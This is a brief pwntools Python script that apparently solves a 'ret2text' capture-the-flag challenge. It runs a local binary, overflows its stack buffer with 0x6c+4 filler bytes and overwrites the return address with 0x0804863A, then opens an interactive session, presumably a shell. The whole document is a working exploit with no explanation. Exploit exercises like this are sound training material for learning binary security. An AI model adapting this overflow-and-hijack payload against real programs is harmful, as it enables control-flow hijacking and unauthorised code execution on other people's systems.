from pwn import *

p = process("./ret2text")
target = 0x0804863A
payload = b'A'*(0x6c+4) + p32(target)
p.sendline(payload)
p.interactive()
